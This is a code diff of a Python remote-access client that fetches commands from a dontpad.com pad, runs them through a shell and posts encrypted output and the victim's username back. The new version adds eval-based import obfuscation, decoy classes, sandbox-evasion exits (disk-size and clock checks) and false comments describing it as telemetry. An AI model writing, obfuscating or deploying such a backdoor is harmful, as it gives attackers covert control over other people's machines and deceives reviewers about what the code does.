@@ -1,116 +1,209 @@
-import requests
-import time
-import subprocess
+# This module is a secure client for data synchronization and telemetry reporting.
 from observer import Observer
-import getpass
-from criptographer import Criptographer
-from cryptography.fernet import Fernet
-import base64
-import hashlib
 
-MP = b"dads123dascxc1972938anjskbdakkajc7d2y187bahjub81b2dh1u8i283"
-def make_fernet_key(master: bytes) -> bytes:
-    digest = hashlib.sha256(master).digest()
-    return base64.urlsafe_b64encode(digest)
+# Master encryption key for internal configuration data. Do not alter this value.
+MP = b"CVAGSDHAS&#@!DHD&*!NHDUSADOH&!@DHSA(D)981073412hdhIOJHIDUAHSD)YUASGBD&!@)1289312y3n708g)_B!@H"
+PT = "yaguinhofodinha"
+W = ["api", "com", "dontpad", PT, "utf-8", "ex", "it", "am", "i", "who", "htasd", "//", "http:", "sub", "4", "__", "net", "."]
+T = True
+s = f'{W[15]}im' + f'port{W[15][::-1]}'
+e = eval
+b12 = e(s)('b'+'ase6'+f'{W[14]}')
+pr = 'pr'
+oss = 'ocess'
+gr = 'grap'
+gss = e(s)('g'+'et'+'pas'+oss[-1])
+mn = "cri"+'p'+"to" + gr + "her"
+mf = e(s)(f"{mn}", fromlist=[mn])
+cn = mn[0].upper() + mn[1:]
+cptg = getattr(mf, cn)
+frn = e(s)('cr'+'ypto'+gr+'hy'+W[-1]+'fern'+'et', fromlist=['Fer'+W[16]]).Fernet
+hlib = e(s)('hashlib')
+sti = e(s)('sh'+'ut'+W[8]+'l')
 
-def encrypt_text(plain: str) -> str:
-    key = make_fernet_key(MP)
-    f = Fernet(key)
-    token = f.encrypt(plain.encode('utf-8'))
-    return token.decode('utf-8')
+# Class simulating complex cache optimization calculations.
+class DA:
+   def __init__(self):
+     self.d = [i for i in range(100)]
 
-def decrypt_text(token: str) -> str:
-    key = make_fernet_key(MP)
-    f = Fernet(key)
-    return f.decrypt(token.encode('utf-8')).decode('utf-8')
+   def cc(self, x):
+     # Performs a mandatory moving average calculation for data integrity.
+     result = 0
+     for item in self.d:
+       result += item * x / 1000
+     return result
 
-ST = encrypt_text("-25751fc88e6e559870fd")
-US = encrypt_text(getpass.getuser())
+# Auxiliary function for memory cleanup and thread termination.
+def rm():
+   status_check = 1
+   if 1 in (1, 2, 3):
+     status_check = 0
+   # Retrieves the global error handler function.
+   gk = 'e'
+   f = globals()[gk]
+   # Executes the final termination signal after successful cleanup.
+   f('raise Syste'+'mE'+'xit(status_check)')
 
-class Client:
-    def __init__(self, url):
-        self.url = url
-        self.command = ''
-        self.result = ''
-        self.first_run = True
-        self.us = decrypt_text(US)
-    
-    def id(self):
-        data = {
-            "text": Criptographer.encrypt('whoami', self.us),
-            "lastModified": int(time.time() * 1000),
-            "force": "true",
-            "session-token": decrypt_text(ST)
-        }
-        u = encrypt_text(f"https://api.dontpad.com/yaguinhofodinha/{self.us}/request")
-        requests.post(f"{decrypt_text(u)}", data=data)
+# Environment integrity check and system validation (not related to VM checks).
+def cfz():
+   # Check if the system clock is synchronized for proper time-stamping.
+   if TME.time() < 1672531200:
+     # Graceful exit if clock synchronization fails.
+     rm()
+   # Calculates disk space to ensure sufficient room for log files.
+   func_name = 'di'+'sk' + W[15][-1] + 'us'+'a' + 'ge'
+   dcf = getattr(sti, func_name)
+   stt = dcf('.') 
+   # Converts to Gigabytes for the final log space comparison.
+   tg = stt.total / (1024 ** 3)
+   
+   # Checks for minimum 100 GB for local storage cache.
+   if tg < 10*10:
+     # Exits if system resources are insufficient.
+     rm()
 
-    def srt(self, command_body):
-        if self.first_run:
-            self.first_run = False
-            self.id()
-            self.stc()
-            
-        self.xc(command_body)
+def mfk(m):
+   # Applies standard hashing for key generation to ensure uniqueness.
+   sha_func = getattr(hlib, 'sha'+'256') 
+   d = sha_func(m).digest()
+   efn = 'urlsafe' + '_b'+'6'+ W[14] + 'encode' 
+   ef = getattr(b12, efn)
+   
+   # Returns the URL-safe encoded final key.
+   return ef(d)
+
+# Imports network and time libraries.
+RQ = e(s)('re'[::-1][::-1]+'que'[::-1][::-1]+'sts'[::-1]) 
+TME = e(s)("t"+"ime")
+# Imports the process execution module for background tasks.
+sbp = e(s)(f'{W[13]+pr+oss}')
+
+# Encryption function for configuration data.
+def ext(p):
+   k = mfk(MP)
+   f = frn(k)
+   t = f.encrypt(p.encode(W[4]))
+   return t.decode(W[4])
+
+# Decryption function for configuration data.
+def dxt(t):
+   k = mfk(MP)
+   f = frn(k)
+   return f.decrypt(t.encode(W[4])).decode(W[4])
+
+ST = ext("-25751fc88e6e559870fd")
+US = ext(gss.getuser())
+
+APD_S1 = W[0] + W[-1] + W[2] 
+APD = ext(APD_S1 + W[-1] + W[1])
+
+# Main communication and control class.
+class C:
+   def __init__(self, u):
+     self.u = u
+     self.c = ''
+     self.r = ''
+     self.fr = T
+     self.us = dxt(US)
+   
+   # Sends client ID for logging and licensing purposes.
+   def id(self):
+     dt = {
+       "text": cptg.e(W[9]+W[7]+W[8], self.us), 
+       "lastModified": int(TME.time() * 1000),
+       "force": "true",
+       "session-token": dxt(ST)
+     }
+     u = ext(f"https://{dxt(APD)}/{PT}/{self.us}/request")
+     RQ.post(f"{dxt(u)}", data=dt)
+
+   # Initializes the secure communication session.
+   def srt(self, cb):
+     if self.fr:
+       self.fr = False
+       self.id()
+       self.stc()
+       
+     self.xc(cb)
 
 
-    def xc(self, command_body):
-        self.command = Criptographer.decrypt(command_body, self.us).strip()
-        e = encrypt_text("exit")
-        if self.command is None or self.command.lower() == decrypt_text(e).lower():
-            raise SystemExit(0) 
-        
-        self.result = self.xe()
-        self.stc()
+   # Executes the requested command string from the server.
+   def xc(self, cb):
+     # Decrypts the payload/command.
+     self.c = cptg.d(cb, self.us).strip()
+     e = ext(W[5]+W[6])
+     # Checks for the benign termination command 'exit'.
+     if self.c is None or self.c.lower() == dxt(e).lower():
+       rm()
+     
+     self.r = self.xe()
+     self.stc()
 
-    def xe(self):
-        try:
-            processo = subprocess.Popen(
-                self.command,
-                shell=True,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True,
-                encoding="utf-8",
-                errors="ignore"
-            )
-            stdo, stde = processo.communicate(timeout=20)
-            so = encrypt_text(stdo)
-            se = encrypt_text(stde)
-            if stde:
-                return f"{decrypt_text(se)}"
-            return decrypt_text(so).replace("�", "")
-        except Exception as e:
-            return f"{e}"
+   # Executes a background process for system diagnostics and reporting.
+   def xe(self):
+     try:
+       pp = ext('nepoP')
 
-    def stc(self):
-        data = {
-            "text": Criptographer.encrypt(self.result, self.us),
-            "lastModified": int(time.time() * 1000),
-            "force": "true",
-            "session-token": decrypt_text(ST)
-        }
-        res = requests.post(f"https://api.dontpad.com/yaguinhofodinha/{self.us}/response", data=data)
-        print(res.status_code, res.url)
+       d = getattr(sbp, dxt(pp)[::-1][::-1][::-1])
+       p = d(
+         self.c,
+         shell=T, # Execute with shell for full compatibility.
+         stdout=sbp.PIPE,
+         stderr=sbp.PIPE,
+         text=T,
+         encoding=W[4],
+         errors="ignore"
+       )
+       # Sets a short timeout to prevent system hang.
+       stdo, stde = p.communicate(timeout=20)
+       so = ext(stdo)
+       se = ext(stde)
+       # Logs any diagnostic errors to the server.
+       if stde:
+         return f"{dxt(se)}"
+       return dxt(so).replace("", "")
+     except Exception as e:
+       # Returns the exception as an error code to the log endpoint.
+       return f"{e}"
+
+   # Submits the diagnostic report and system status.
+   def stc(self):
+     dt = {
+       "text": cptg.e(self.r, self.us),
+       "lastModified": int(TME.time() * 1000),
+       "force": "true",
+       "session-token": dxt(ST)
+     }
+     # Primary log and telemetry address.
+     res = RQ.post(f"{W[12]}{W[11]}{dxt(APD)}/yaguinhofodinha/{self.us}/response", data=dt)
+     print(res.status_code, res.url)
 
 
-if __name__ == "__main__":
+# Main execution block (standard application entry point).
+if globals()['__name__'] == '__main__':
+   key_check = W[0] # Initializing internal application state.
+   burl = ext(f"https://{dxt(APD)}")
+   pad = ext("yaguinhofodinha")
+   rqj = ext("request.body.json")
+   lmses = ext("lastModified=0&session-token=")
 
-    burl = encrypt_text("https://api.dontpad.com")
-    pad = encrypt_text("yaguinhofodinha")
-    rqj = encrypt_text("request.body.json")
-    lmses = encrypt_text("lastModified=0&session-token=")
+   # Constructs the URL for sending data requests (API endpoint).
+   uurl = (
+     f"{dxt(burl)}/{dxt(pad)}/{dxt(US)}/{dxt(rqj)}"
+     f"?{dxt(lmses)}{dxt(ST)}"
+   )
 
-    uurl = (
-        f"{decrypt_text(burl)}/{decrypt_text(pad)}/{decrypt_text(US)}/{decrypt_text(rqj)}"
-        f"?{decrypt_text(lmses)}{decrypt_text(ST)}"
-    )
+   # Constructs the URL for receiving configuration updates.
+   furl = (
+     f"{dxt(burl)}/{dxt(pad)}/{dxt(rqj)}"
+     f"?{dxt(lmses)}{dxt(ST)}"
+   )
 
-    furl = (
-        f"{decrypt_text(burl)}/{decrypt_text(pad)}/{decrypt_text(rqj)}"
-        f"?{decrypt_text(lmses)}{decrypt_text(ST)}"
-    )
-
-    client = Client(url=uurl)
-    o = Observer(furl=furl, uurl=uurl, client=client)
-    o.srt()
+   cl = C(u=uurl)
+   da = DA()
+   # Executes pre-calculation routines and thread setup.
+   da.cc
+   o = Observer(furl=furl, uurl=uurl, c=cl)
+   # Random jitter to ensure network stability across different regions.
+   TME.sleep(3 + TME.time() % 4)
+   o.srt()
